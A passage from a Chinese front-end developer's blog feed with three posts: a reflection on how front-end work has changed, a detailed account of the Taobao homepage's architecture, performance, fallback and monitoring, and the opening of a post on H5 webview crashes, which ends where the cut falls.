        <content type="html"><![CDATA[<p>我接触前端的时间不长也不短，12 年入门，14 年初在百度实习，14 中正式参加工作，掐指一算 4 年整。然而这四年间前端的变化已经让很多人摸不着头脑。</p><span id="more"></span><p>昨天还发了一条状态，<a href="http://weibo.com/1812166904/DzM0s3RAu">调侃 jQuery 是一个坚韧的社区</a>，有人留言问我为什么这么说。</p><p>记得刚入前端这个坑时，jQuery 异常火爆，图书馆的相关书籍俯拾皆是，博客园上的文章介绍多若繁星，jQuery 插件铺天盖地，可谓盛况空前。然而，随着多端设备的兴起和界面需求的不断强盛，jQuery 几乎已经不能胜任日常开发了，时常会在加载缓慢的页面上看到一堆性能低下的 jQuery 组件，被胡乱地拼凑到一起，那场面，就像进入了一间很久没有打扫过的屋子，弥散着臭味和灰尘。</p><p>前端是一个喜欢发明问题和解决问题的物种，它干着杂乱无章的活儿，却又在用户的视角前凸显自己整洁。从缤纷的组件，到工程化、组件化，再到模块化，然后回归到语言本身的进化，紧接着又是一轮新的变革。技术在变，社区也在变，社区只是技术演变的一个容器，技术的终点是回归业务。</p><p>业务中出来的问题太多，而解决问题的方案则更多，每隔一小段时间前端就会突然蹦出几个新鲜的名词。把单词拆开来看每个字母都认识，但拼凑到一块儿，就只能眼睛瞪鼻子了。不管我们使出多少气力，投入多少时间，新的技术总是学不完，也学不通透，学透了却发现没有实践的场景。于是越来越多前端开始彷徨，“我是不是跑偏了？”，“这玩意儿要不要学？”，“这技术刚听说怎么就被淘汰了？”，“怎么出去旅个游回来感觉落后了半个世纪？”。</p><p>对，这就是前端圈子的现状。五年前，你可以说搞前端的很肤浅，而今天——你依然可以这么说🙈——前端的知识体量上升了一个台阶，但我们做的事情依然没变，切！页！面！只是我们发明了更多更丰富的切页面工具，让运营帮我们切，让程序帮我们切，让机器帮我们切。</p><p>在切页面的同时，我们的职能也发生了一些改变，我们需要掌握更多的工具和更多的语言，从客户端延伸到了服务端甚至运维层面，从前端资源演变成了产品的主导者，带着运营和产品经理玩游戏，我们甚至可以提供玩法，他们跳进来玩耍。</p><p>前端这几年变得丰满了许多，可以深入的方向更多了。无线、Node、类 React、模块化、工程化等等，开始出现了「前端领域」这个概念，它不再是笼统的 HTML&#x2F;CSS&#x2F;JavaScript 杂烩，每个领域都有专家，每个领域都有自己的研究方法。所以前端也出现了很多的机会，以及更多的趣味性——事实上，前端那种所见即所得的开发，本身就是一种趣味。</p><p>也有很多人不断地为前端圈地盘，在知识边界上开疆拓土，如 Docker、HTTPS、自动化、运维等等，甚至直接跨端跨界跨语言与其他方向擦出奇妙的火花。</p><p>前端演变很快很剧烈，找到自己的一席之地很重要。</p><p>那么文章的最后，抛出一串问题，在漫漫前端的发展史上，你经历过哪些？你学到了哪些？你属于哪个层级？你将要去哪里？</p>]]></content>
      
      
      <categories>
          
          <category> 前端杂烩 </category>
          
          <category> 观点和感想 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 前端 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>聊一聊淘宝首页和它背后的一套</title>
      <link href="/blog/2016/06/02/thing-about-taobao-homepage/"/>
      <url>/blog/2016/06/02/thing-about-taobao-homepage/</url>
      
        <content type="html"><![CDATA[<p>从 14 年双十二结束开始接手淘宝首页，到如今差不多 1 年半时间，不久前完成了首页相关工作的交接。期间经历了两次改版和一次从 PHP 到 Node 的迁移，还是颇有感受，下面给大家分享下。</p><span id="more"></span><p>文章好像有点长，列个大纲会比较好：</p><blockquote><p>一、相关背景介绍<br>二、淘宝首页的整理变迁<br>　　1. PHP 下的淘宝首页<br>　　2. PHP 到 Node 的变迁<br>　　3. Node，不一样的模式<br>三、淘宝首页的性能优化<br>　　1. 页面渲染逻辑<br>　　2. 一起来看看淘宝首页的个性化<br>　　3. 淘宝首页性能优化实践<br>四、淘宝首页的稳定性保障<br>　　1. 兜底容灾机制<br>　　2. 监控预警机制<br>　　3. 上线前的自动化检测<br>五、淘宝首页的敏捷措施<br>　　1. 健康检查<br>　　2. 接口 Hub<br>　　3. 快捷通道<br>六、小结</p></blockquote><h3 id="一、相关背景介绍"><a href="#一、相关背景介绍" class="headerlink" title="一、相关背景介绍"></a>一、相关背景介绍</h3><p>淘宝首页是淘宝的门面，承载着几乎淘系所有业务的入口，流量很大，量级单位为亿。近几年无线端崛起，业务重点开始向无线终端偏移（目前不能叫偏移，基本以无线为主了），所以淘宝 PC 端首页的流量也有削减，不过即便如此，它的日均 PV 依然相当高。</p><p>淘宝首页一向是内部平台和技术的试验田，它一直在变化着。最新的框架和系统都会找淘宝首页试点，可以试想下，如果某一项需要推动的升级或者优化措施在淘宝首页已经上线，并且拿到了良好的数据和稳定性，其他业务还有什么理由不去尝试和更迭呢？同时，去年一年身在淘宝前端的技术架构组，自然而然也会主动去 push 一些实验性的内容到业务上。</p><p>淘系的站点页面包括首页、其他频道页和活动页等，这些页面并不都由淘宝前端一行一行的代码码出来，业务如此之多，这种玩法即便人数 double 也忙不过来。事实上，大多数页面都是依托内部的搭建平台——运营或者前端通过模块搭建的方式——构建的，而前端 focus 的重点在于搭建平台的建设自身以及模块的通用性和复用率的保障，当然，还有一些工程化的东西。</p><p>使用搭建平台搭建的页面，前端只需要考虑组成页面的原子模块的开发，整体的渲染由搭建平台提供的统一脚本全权负责。而在淘宝首页上，考虑到页面模块数量巨多，加上还有少量跨部门、跨团队的沟通，渲染模型略微不同。</p><h3 id="二、淘宝首页的整体变迁"><a href="#二、淘宝首页的整体变迁" class="headerlink" title="二、淘宝首页的整体变迁"></a>二、淘宝首页的整体变迁</h3><p>背景中提到，淘宝首页依托于内部搭建平台，它的变迁自然也是跟着搭建系统的变化而变化的。</p><h4 id="1-PHP-下的淘宝首页"><a href="#1-PHP-下的淘宝首页" class="headerlink" title="1. PHP 下的淘宝首页"></a>1. PHP 下的淘宝首页</h4><p>接手淘宝首页不久，便遇到了一年一度的改版，那时它还运行在 PHP 环境中。这里需要说明的是，淘宝首页的所有代码完全由前端掌控，前端不会直接跟数据库打交道，其数据来源分为两部分。</p><p><strong>数据来源</strong></p><p>一是 <em>运营填写的数据。</em> 采用前端挖坑的形式，预留坑位让运营获取填写数据，如（伪代码）：</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="variable">$info</span> = <span class="title function_ invoke__">Person</span>(<span class="string">&#x27;name:String:姓名,age:Number:年龄&#x27;</span>, <span class="string">&#x27;个人信息坑位填写&#x27;</span>);<span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">&lt;div&gt;</span><br><span class="line"><span class="meta">&lt;?php</span> <span class="variable">$info</span>.<span class="title function_ invoke__">forEach</span>(index) &#123; <span class="meta">?&gt;</span></span><br><span class="line">  Name: <span class="meta">&lt;?=</span> info[index].name <span class="meta">?&gt;</span>, Age: <span class="meta">&lt;?=</span> info[index].age <span class="meta">?&gt;</span></span><br><span class="line"><span class="meta">&lt;?php</span> &#125; <span class="meta">?&gt;</span></span><br><span class="line">&lt;/div&gt;</span><br></pre></td></tr></table></figure><p>上面的代码会产生一份 PHP 的模板和 info 字段对应的表单坑位，这个过程简称「挖坑」。</p><p><img src="/../blogimgs/2016/06/02/6c0378f8gw1f4g54zdicej20do09cdfy.jpg" alt="挖坑"><!--<source src="https://ww1.sinaimg.cn/large/6c0378f8gw1f4g54zdicej20do09cdfy.jpg">--></p><p>运营填写这些坑位就会产生这份 PHP 模板对应的数据，最后渲染出来就是一个完整的 HTML 片段（实时性渲染）。</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">.</span><br><span class="line">├── data.json   <span class="comment"># 运营数据的来源</span></span><br><span class="line">└── index.php   <span class="comment"># 装载运营数据的 PHP 模板</span></span><br></pre></td></tr></table></figure><p>旧版搭建系统中就是通过这种方式构造一个子模块。我描述得十分简单，但作为一个平台它需要考虑的东西还有很多很多的，比如数据顺序的控制、定时发布、回滚机制、过滤机制、筛选机制、数据的同步、数据的更新、版本控制、权限控制、其他系统的引用等等。</p><p>二是 <em>后端或者个性化平台提供的数据。</em> 不同的业务有不同的诉求。一些业务有自己的后端，他们要求使用自己业务产出的数据；有的业务希望用户看到的内容不一样，千人千面，期望接入算法；一些业务跟卖家直接打交道，期望使用招商数据；而有些业务期望采用运营从数据池筛选出来的数据…总之，淘宝首页需要对接形形色色的系统，接口繁多。后面会提到对动态数据源的整合。</p><p>并且这些系统对应的域名是不一样的，JSONP 格式自然也就成了首选。但一些特殊的系统，比如广告，它的渲染并不是一个简单的 JSONP 请求，可能它还要干预整个广告的渲染流程，比如加载他们的 JS，把渲染的控制权交过去。</p><p><strong>页面的架构</strong></p><p>上面介绍了数据的来源和子模块的结构，那么整个页面又是如何构成的呢？模块的搭建分为两种，一种是可视化搭建，运营或者前端可以将开发好的模块（或者模块库中选取的模块）拖拽到容器内，形成一个页面，</p><p><img src="/../blogimgs/2016/06/02/6c0378f8gw1f4g51ddlmzj21ao0x4dij.jpg" alt="模块搭建"><!--<source src="https://ww1.sinaimg.cn/large/6c0378f8gw1f4g51ddlmzj21ao0x4dij.jpg">--></p><p>当然，上图也只是一个模型，作为一个系统需要考虑的问题还有很多很多，如页面的布局、多终端适配、模块的临时隐藏、位置调整、皮肤选择、模块的复制等等。</p><p>也可以通过如下源码搭建的方式（伪代码）：</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&lt;body&gt;</span><br><span class="line">  <span class="meta">&lt;?=</span> <span class="title function_ invoke__">loadModule</span>(Mod1ID) <span class="meta">?&gt;</span></span><br><span class="line">  <span class="meta">&lt;?=</span> <span class="title function_ invoke__">loadModule</span>(Mod2ID) <span class="meta">?&gt;</span></span><br><span class="line">  <span class="meta">&lt;?=</span> <span class="title function_ invoke__">loadModule</span>(Mod3ID, <span class="string">&#x27;lazyload&#x27;</span>) <span class="meta">?&gt;</span></span><br><span class="line">  <span class="meta">&lt;?=</span> <span class="title function_ invoke__">loadModule</span>(Mod4ID, <span class="string">&#x27;lazyload&#x27;</span>) <span class="meta">?&gt;</span></span><br><span class="line">  <span class="meta">&lt;?=</span> <span class="title function_ invoke__">loadModule</span>(Mod5ID, <span class="string">&#x27;lazyload&#x27;</span>) <span class="meta">?&gt;</span></span><br><span class="line">&lt;/body&gt;</span><br></pre></td></tr></table></figure><p>通过模块 id 将模块引入，并且添加一些类似 <code>lazyload</code> 的标记，方便控制渲染节奏和数据入口。源码搭建和模块搭建的区别在于，前者更易于控制模块的结构以及模块的渲染顺序。</p><p><strong>动态数据源</strong></p><p>首页面对一大堆接口和平台，对接几十个业务方，接口是个很大的问题，由于后台系统的差异，基本没有办法统一数据源的格式，一旦运营哪天心血来潮要换一个他自己觉得用的更爽的或者数据更好的系统，前后端估计又得沟通和对接几次。所以出现了下面这张图：</p><p><img src="/../blogimgs/2016/06/02/6c0378f8gw1f4g5mwl5jzj218w0psdia.jpg" alt="动态数据源"><!--<source src="https://ww1.sinaimg.cn/large/6c0378f8gw1f4g5mwl5jzj218w0psdia.jpg">--></p><p>平台具备数据源接入的能力，也就是说我们挖的坑不仅仅可以让运营填数据，还可以从各种数据源中直接导入数据，当然，这里需要进行一次数据字段的映射转换。后端提供的接口是这样的：</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  <span class="string">&quot;data&quot;</span>: [&#123;</span><br><span class="line">    <span class="string">&quot;item_name&quot;</span>: <span class="string">&quot;name&quot;</span>,</span><br><span class="line">    <span class="string">&quot;item_url&quot;</span>: <span class="string">&quot;http://xxx&quot;</span>,</span><br><span class="line">    <span class="string">&quot;item_pic&quot;</span>: <span class="string">&quot;http://xxx&quot;</span></span><br><span class="line">  &#125;]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>前端约定的接口形式是: </p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  <span class="string">&quot;info&quot;</span>: [&#123;</span><br><span class="line">    <span class="string">&quot;name&quot;</span>: <span class="string">&quot;name&quot;</span>,</span><br><span class="line">    <span class="string">&quot;url&quot;</span>: <span class="string">&quot;http://xxx&quot;</span></span><br><span class="line">  &#125;]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>那么系统必须提供这种映射的绑定策略：</p><figure class="highlight xl"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="title">info</span>/<span class="keyword">name</span> -&gt;</span> <span class="keyword">data</span>/item_name</span><br><span class="line"><span class="function"><span class="title">info</span>/url -&gt;</span> <span class="keyword">data</span>/item_url</span><br></pre></td></tr></table></figure><p>绑定之后，数据既可以同步输出，也可以异步输出，这些都是平台提供的能力。这个方案基本上解决了后端系统&#x2F;接口变化的问题，并且减少了前后端之间的沟通成本。</p><p>不过这里需要注意的是，虽然页面上的接口都通过平台统一梳理了一次，这也意味着，页面所有的请求会先流经平台，然后分发到各个后端，平台的抗压能力要求很高。</p><h4 id="2-PHP-到-Node-的变迁"><a href="#2-PHP-到-Node-的变迁" class="headerlink" title="2. PHP 到 Node 的变迁"></a>2. PHP 到 Node 的变迁</h4><p>淘宝首页日均请求的这个量级，不可能是十几二十台台服务器抗得住的，支撑它必须有一个服务集群。</p><p><img src="/../blogimgs/2016/06/02/6c0378f8gw1f4g6rdqpd0j212o0s076f.jpg" alt="集群"><!--<source src="https://ww1.sinaimg.cn/large/6c0378f8gw1f4g6rdqpd0j212o0s076f.jpg">--></p><p>每一个 CDN 节点上都具备 PHP 渲染的能力，当页面发布时，我们把该页面所有的模块和数据同步到全部 CDN 节点上，基本模式大概就是如此了。看起来还挺不错，但是经过一段时间的运维，很多安全、性能问题都慢慢浮现出来了：</p><p><em>性能问题。</em> 每个 PHP 页面包含多个子模块，而子模块也有可能引用了其他的子模块，PHP 的 <code>include</code> 操作是存在消耗的，每一次引用都是一次磁盘 IO，一个渲染节点上跑了成千上万个类似淘宝首页的 PHP 页面，并发一高其效率可想而知。</p><p class="barretSay">// @邦彦 同学补充：php 的 include 操作是存在消耗，但是加载、执行的过程预热后，字节码直接进缓存，并不存在频繁磁盘 io 的情况。cdn php 性能差的问题主要是两个：1. php 版本过旧，5.4 和 7 的性能相差不只几倍；2. fast-cgi 模式在高并发的场景下和 node 相比没有任何优势。</p><p><em>推送机制问题。</em> 文件同步（图中的 <code>sync</code> 动作）是一种比较恶心的机制，首先，时间上没法控制，一个文件同步到所有的节点，快则几秒钟，慢的话耗时会超过一两分钟；并且同步过程还有可能失败，健康检测的成本也是相当高的。发布比较紧凑时，需要同步的文件也很多，很容易造成队列堆积，加剧同步差的体验。</p><p><em>实时性强需求问题。</em> 文件在推送之前，还可能经过一些前置系统，发布链路越长，线上生效时间越慢，慢的时候大约五分钟才生效，这样的延时对于实时性要求很高（如秒杀）的需求来说是完全不能接受的。</p><p>当然，还有很多其他问题，如运维成本增高、安全风险增高、PHP 资深人才储备不足等等。所以 PHP 渲染容器的命运，就是，被干掉。</p><p><img src="/../blogimgs/2016/06/02/6c0378f8gw1f4g7eogvy9j21840tatb1.jpg" alt="回源"><!--<source src="https://ww1.sinaimg.cn/large/6c0378f8gw1f4g7eogvy9j21840tatb1.jpg">--></p><p>上图改变了下玩法，服务集群为 Cache CDN，它只有静态文件处理能力，没有 PHP&#x2F;Node 的渲染能力，所以处理效率高，性能也好，抗压能力相当强，并且扛不住的时候还可以花钱买服务，拓展 Cache 集群。</p><p>用户访问时，Nginx 转到 Cache CDN，如果命中缓存则直接返回，没有命中便回源到源站服务器。源站服务器是具备模块渲染能力的 Node 服务，它可以做很多事情：</p><ul><li>控制 Cache 响应头，通过 <code>max-age</code> 和 <code>s-maxage</code> 控制页面在客户端的缓存时间以及在 Cache 上的缓存时间，这个缓存时间可以根据需求随时做调整，比如大促的时候调长一些</li><li>控制内外网环境，和 AB 测试状态</li><li>融合前端相关的工具链，比如检测、压缩、过滤等等</li></ul><p>它的优势有很多，这里不一一列举了。这个模式中还添加了一层容灾，源站服务器每隔一段时间将数据推送到于 Cache 同机房的备份服务器，一旦源站挂了，还能够自动容灾到备份数据上。</p><p>模式的变化不仅在运维上有了突破，CDN 被攻击时的安全风险也低了很多，同时也省却了 sync 所需的各种检测机制，每年节约成本也是百万以上，优势还是相当明显。</p><h4 id="3-Node，不一样的模式"><a href="#3-Node，不一样的模式" class="headerlink" title="3. Node，不一样的模式"></a>3. Node，不一样的模式</h4><p>上面 PHP 模块中，我们只说了 HTML 和数据部分，用心的读者应该已经发现，CSS 和 JS 这些静态资源都没提到，那页面是如何渲染的呢？</p><p>旧版 PHP 页面中，我们是直接引入了一个 CSS 和一个 JS，淘宝这边采用的是 git 版本迭代发布，这些静态资源都是直接放在一个 git 仓库中。也就是这样：</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&lt;head&gt;</span><br><span class="line">  &lt;link rel=<span class="string">&quot;stylesheet&quot;</span> href=<span class="string">&quot;//cdn/@VERSION@/index.css&quot;</span>&gt;</span><br><span class="line">  &lt;script src=<span class="string">&quot;https://cdn/@VERSION@/index.js&quot;</span>&gt;&lt;/script&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">  <span class="meta">&lt;?=</span> <span class="title function_ invoke__">loadModule</span>(Mod1ID) <span class="meta">?&gt;</span></span><br><span class="line">  <span class="meta">&lt;?=</span> <span class="title function_ invoke__">loadModule</span>(Mod2ID) <span class="meta">?&gt;</span></span><br><span class="line">  <span class="meta">&lt;?=</span> <span class="title function_ invoke__">loadModule</span>(Mod3ID, <span class="string">&#x27;lazyload&#x27;</span>) <span class="meta">?&gt;</span></span><br><span class="line">  <span class="meta">&lt;?=</span> <span class="title function_ invoke__">loadModule</span>(Mod4ID, <span class="string">&#x27;lazyload&#x27;</span>) <span class="meta">?&gt;</span></span><br><span class="line">  <span class="meta">&lt;?=</span> <span class="title function_ invoke__">loadModule</span>(Mod5ID, <span class="string">&#x27;lazyload&#x27;</span>) <span class="meta">?&gt;</span></span><br><span class="line">&lt;/body&gt;</span><br></pre></td></tr></table></figure><p>每次发布完 git 文件，再修改 PHP 的版本号，然后发布 PHP 代码。当然，也做了相关的优化，比如发布 git 时自动更新版本号等。</p><p>而新版搭建平台的页面渲染模式与 PHP 的模式不太一样。</p><p><img src="/../blogimgs/2016/06/02/6c0378f8gw1f4g8566uz3j21kw0yt79h.jpg" alt="Node渲染模型"><!--<source src="https://ww1.sinaimg.cn/large/6c0378f8gw1f4g8566uz3j21kw0yt79h.jpg">--></p><p>一个模块的 CSS&#x2F;JS 和模板放在一起，CSS&#x2F;JS 与页面其他模块的静态资源是相互独立的，目的就是希望单个模块也能够完整的跑起来，更加利于模块的复用。</p><p>而模块的挖坑，也从模板中独立了出来，采用 JSON Schema 的形式定义数据格式，</p><figure class="highlight axapta"><table><tr><td class="code"><pre><span class="line">.</span><br><span class="line">├── <span class="keyword">index</span>.css    <span class="meta"># 模块样式</span></span><br><span class="line">├── <span class="keyword">index</span>.js     <span class="meta"># 模块渲染脚本</span></span><br><span class="line">├── schema.json  <span class="meta"># schema 配置</span></span><br><span class="line">└── <span class="keyword">index</span>.xtpl   <span class="meta"># 模块的模板</span></span><br></pre></td></tr></table></figure><p>搭建平台通过这个 JSON Schema 解析成 <a href="//ww1.sinaimg.cn/large/6c0378f8gw1f4g54zdicej20do09cdfy.jpg">图一</a> 的坑位。那么一个模块的渲染就变成了 <code>index.xtpl</code> 和挖坑数据之间的拼装了。</p><p>模块之间相互独立隔离，所以会存在一定程度的冗余，不过模块解偶带来的收益要比这点冗余要多得多。事实上，我们是通过一个仓库去管理单个模块的。页面的渲染就比较简单了，源站 Node 容器会将所有的 <code>index.xtpl</code> 合并成一个 <code>page.xtpl</code>，为减少页面请求，css 和 js 也会 combo 成一个文件，如上图所示的 <code>http://cdn/??mod1.css,mod2.css,mod3.css</code>。</p><p>任何模块的更新，页面都会有感知，下次进入系统时，就会提示是否需要升级模块和页面。这里内容比较多，我不细说，感兴趣的可以找我 <a href="http://weibo.com/173248656">私聊</a>。</p><h3 id="三、淘宝首页的性能优化"><a href="#三、淘宝首页的性能优化" class="headerlink" title="三、淘宝首页的性能优化"></a>三、淘宝首页的性能优化</h3><p>首页模块众多，如果一口气吐出来，DOM 数量必然超过 4k 个，其结果就是首屏时间极长。按照 TMS 的开发规范，每个 TMS 模块都包含一个 <code>index.js</code> 和 <code>index.css</code>，最后展示出来两个 combo 的 js 和 css。首页加载的时候也不会一口气执行所有 <code>index.js</code>，否则刚开始页面阻塞会十分严重。</p><p><strong>页面的渲染逻辑</strong></p><p><img src="/../blogimgs/2016/06/02/6c0378f8gw1f4gse45ss8j20fn0jr0v3.jpg" alt="页面的渲染逻辑"><!--<source src="https://ww1.sinaimg.cn/large/6c0378f8gw1f4gse45ss8j20fn0jr0v3.jpg">--></p><p>首页框架的加载逻辑，大致上图所示：</p><ul><li>遍历所有 TMS 模块（包含一个 <code>J_Module</code> 的钩子）</li><li>部分 TMS 模块无 JS 内容，但是加载了一个 <code>index.js</code>，为模块添加 <code>tb-pass</code> 的 class，用于跳过该模块 JS 的执行</li><li>将页面分为两块，首屏为一块，非首屏整体为第二块，先将首屏模块加入到懒加载监控</li><li>待首屏模块加载完成，或者用户处理了页面交互时（滚动、鼠标移动等），将非首屏模块加入到懒加载监控</li><li>处理一些特殊模块，它们会在进入视窗之前几百像素就开始加载</li><li>监控滚动，按照以上逻辑，渲染模块</li></ul><p>部分模块即便是被执行了，也不一定渲染出来，因为它的优先级不高，在模块内部加了事件监听，比如等到 <code>mouseover/onload</code> 事件触发的时候再渲染这些内容。</p><p>之前写过性能优化相关的文章，复制就没必要了，直接贴地址：</p><ul><li><a href="https://www.barretlee.com/blog/2016/03/31/personality-in-taobao-home-page/">《一起来看看淘宝首页的个性化》</a></li><li><a href="https://www.barretlee.com/blog/2016/04/01/optimization-in-taobao-homepage/">《淘宝首页性能优化实践》</a></li></ul><p>代码的性能优化是一个精细活，如果你要在一个庞大的未经优化的页面上做性能优化，可能会面临一次重构代码。</p><p>上面的文章提到的是页面内部的细节优化，但是在开发流程中做的规范化、标准化，以及线上访问通路中的各个环节优化还没有提及。这一块内容可能有点跑题，就不多说了。</p><h3 id="四、淘宝首页的稳定性保障"><a href="#四、淘宝首页的稳定性保障" class="headerlink" title="四、淘宝首页的稳定性保障"></a>四、淘宝首页的稳定性保障</h3><p>在大流量下，任何小问题都会被放大成大问题，所以开发环节遇到的任何偶发性问题都需要引起重视。不过很多偶发性问题在我们的测试环境中是找不到的，比如与地域相关的问题（如上海的某个 CDN 节点挂了），用户属性问题（如 nickname 最后一个为字母 s 的用户页面天窗），浏览器插件问题，运营商广告注入问题等等。</p><p>难以在上线之前把所有问题考虑周全，但是有两点是必须做好的：<strong>兜底容灾 + 监控预警。</strong></p><h4 id="1-兜底容灾机制"><a href="#1-兜底容灾机制" class="headerlink" title="1. 兜底容灾机制"></a>1. 兜底容灾机制</h4><p>兜底容灾有两个层面的考虑：</p><ul><li>异步接口请求错误，包括接口数据格式错误，接口请求超时等</li><li>同步渲染，源站页面渲染出错</li></ul><p>异步接口请求，主要涉及到的是后台系统，对接系统较多，各个系统的稳定性和抗压能力各不相同，这方面的保障有多种方案，下面是最常见的：</p><p><img src="/../blogimgs/2016/06/02/6c0378f8gw1f4go51ui9zj20kh0h7n0b.jpg" alt="请求缓存"><!--<source src="https://ww1.sinaimg.cn/large/6c0378f8gw1f4go51ui9zj20kh0h7n0b.jpg">--></p><p>每次数据请求都缓存到本地，并且为每个接口都提供一个硬兜底。还有一种方案是「重试」，请求一次不成功那就请求第二次。这方面的讨论具体可以看看之前写的这篇文章：<a href="https://www.barretlee.com/blog/2015/09/16/backup-solution-at-big-traffic/">《大流量的下兜底容灾方案》</a>。</p><p>对于同步渲染，它只需要页面模板和同步数据，两者中任一种存在错误，源站都会报错，此时回源返回的内容就是一个 error 页面，状态码为 <code>5xx</code>。这个错误不一定是开发者造成的，有可能是系统链路出现同步异常或者断路问题。针对这种问题，我给淘宝首页做了一个镜像页：</p><p><img src="/../blogimgs/2016/06/02/6c0378f8gw1f4gonwmraoj21ce0rq0vr.jpg" alt="镜像"><!--<source src="https://ww1.sinaimg.cn/large/6c0378f8gw1f4gonwmraoj21ce0rq0vr.jpg">--></p><p>一旦源站任何异常，Nginx 都会转到与 Cache CDN 同机房的首页镜像上去，这个镜像内容就是淘宝首页的 HTML 备份源码。</p><h4 id="2-监控预警机制"><a href="#2-监控预警机制" class="headerlink" title="2. 监控预警机制"></a>2. 监控预警机制</h4><p>可以先看看之前写的这篇文章：<a href="https://www.barretlee.com/blog/2015/08/20/cb-fe-monitor/">《前端代码异常日志收集与监控》</a>，介绍了一些监控方法。</p><p>监控也有两个层面：</p><ul><li>模块级别的监控，接口请求布点、模块天窗检测等</li><li>页面的监控，在页面上添加特殊标记，定时回归所有 CDN 节点，查看特殊标记是否存在</li></ul><p>模块层面的监控，内容还是相当多的，监控的点越多越详细，到最后定位问题的效率就会越高，比如在一个稍微复杂的模块上，我会埋下这些监控：</p><ul><li>接口请求格式错误、请求失败、请求超时，至少三个埋点</li><li>硬兜底数据请求失败埋点</li><li>模块 5s 内没有渲染完成统计埋点</li><li>模块内链接和图片黑白名单匹配埋点</li></ul><p><img src="/../blogimgs/2016/06/02/6c0378f8gw1f4gtw0jjxxj20w50akace.jpg" alt="监控"><!--<source src="https://ww1.sinaimg.cn/large/6c0378f8gw1f4gtw0jjxxj20w50akace.jpg">--></p><p>其中部分监控还会自动处理明确的错误，比如 https 页面下出现了 http 的图片，会立即自动处理掉这些问题。</p><h4 id="3-上线前的自动化检测"><a href="#3-上线前的自动化检测" class="headerlink" title="3. 上线前的自动化检测"></a>3. 上线前的自动化检测</h4><p>这属于淘宝整个工程化环境的一部分，前端自动化测试。一般会在上线之前处理这些问题：</p><ul><li>检测 HTML 是否符合规范</li><li>检测 https 升级情况</li><li>检测链接合法性</li><li>检测静态资源合法性</li><li>检测 JavaScript 报错</li><li>检测页面加载时是否有弹出框</li><li>检测页面是否调用 <code>console.*</code></li><li>页面 JS 内存记录</li></ul><p>当然，也可以自己添加测试用例，比如检测接口数据格式、模块天窗问题等。自动化检测也可以设定定时回归，还是比较有保障的。</p><h3 id="五、淘宝首页的敏捷措施"><a href="#五、淘宝首页的敏捷措施" class="headerlink" title="五、淘宝首页的敏捷措施"></a>五、淘宝首页的敏捷措施</h3><h4 id="1-健康检查"><a href="#1-健康检查" class="headerlink" title="1. 健康检查"></a>1. 健康检查</h4><p>页面模块众多，为了能够追踪页面上每一个小点的变化，我在请求、渲染的每一个环节都做了详细的统计，如下图所示：</p><p><img src="/../blogimgs/2016/06/02/6c0378f8gw1f4gt6p2lsfj20la0gmjwg.jpg" alt="Console"><!--<source src="https://ww1.sinaimg.cn/large/6c0378f8gw1f4gt6p2lsfj20la0gmjwg.jpg">--></p><p>一旦接口请求失败，或者接口走了容灾逻辑，或者模块渲染超过 5s，控制台都会有黄色警报，当然此时，也已经向服务器发送了警报统计。</p><h4 id="2-接口-Hub"><a href="#2-接口-Hub" class="headerlink" title="2. 接口 Hub"></a>2. 接口 Hub</h4><p>接口 Hub 是对数据请求的管理工具，如下图所示：</p><p><img src="/../blogimgs/2016/06/02/6c0378f8gw1f4gt7e0p74j20j70cvtbv.jpg" alt="HubCache"><!--<source src="https://ww1.sinaimg.cn/large/6c0378f8gw1f4gt7e0p74j20j70cvtbv.jpg">--></p><p>页面很多模块的渲染都需要一个以上的数据源，一旦运营反馈页面渲染数据异常，可以直接通过 Hub 找到数据，加速 Bug 定位效率。同时 Hub 也可以用来切换环境，将一个接口的请求切换到日常或者预发环境的接口之中，它是调试的利器。</p><h4 id="3-快捷通道"><a href="#3-快捷通道" class="headerlink" title="3. 快捷通道"></a>3. 快捷通道</h4><p>我在页面脚本执行前后都放了一个快捷操作通道，一旦遇到紧急线上问题，比如样式错乱溢出、接口报错导致天窗等，可以通过快捷通道直接修改页面的 CSS 和 JS，两分钟内上线。</p><p>不过这类通道只适合紧急问题的修复，毕竟随意插入 JS 代码是存在很大风险的。</p><h3 id="六、小结"><a href="#六、小结" class="headerlink" title="六、小结"></a>六、小结</h3><p>写的好像有点虎头蛇尾（码字和画图都太累），还有很多方面没有延伸拓展开。希望以上可以让你对淘宝首页有一个基本的认识。</p>]]></content>
      
      
      <categories>
          
          <category> 前端杂烩 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 淘宝首页 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>H5 Crash 研究</title>
      <link href="/blog/2016/05/30/h5-crash-research/"/>
      <url>/blog/2016/05/30/h5-crash-research/</url>
      
        <content type="html"><![CDATA[<p>我们知道，支撑页面在 webview 上良好运转的前提是具备一个高效并且稳定的 webview 容器，而容器的高效稳定不仅仅由容器提供方来保障，也需要容器使用者遵守一些基本准则，否则就有可能出现页面 Crash 的情况，这些准则是什么？什么样的上层代码会引起容器异常退出？这是本文需要阐述的内容。</p><span id="more"></span><h3 id="H5-Crash-问题概况"><a href="#H5-Crash-问题概况" class="headerlink" title="H5 Crash 问题概况"></a>H5 Crash 问题概况</h3><p>下图是 H5 Crash 的大致流程图：</p><p><img src="/../blogimgs/2016/05/30/TB1FCOOKXXXXXccXXXXXXXXXXXX-676-667.png" alt="H5 Crash 流程图"><!--<source src="https://img.alicdn.com/tfs/TB1FCOOKXXXXXccXXXXXXXXXXXX-676-667.png">--></p><p>由于前端没办法捕捉到页面 Crash 的状态和堆栈，但是 H5 页面上发生的错误会传递到 Java 和更底层的 Native 直到容器异常退出，在退出的那一刻，容器会将堆栈写入到日志中，当下次打开容器时（也可能是定时上报）就会上报这些堆栈信息。</p><h3 id="H5-Crash-原因初探"><a href="#H5-Crash-原因初探" class="headerlink" 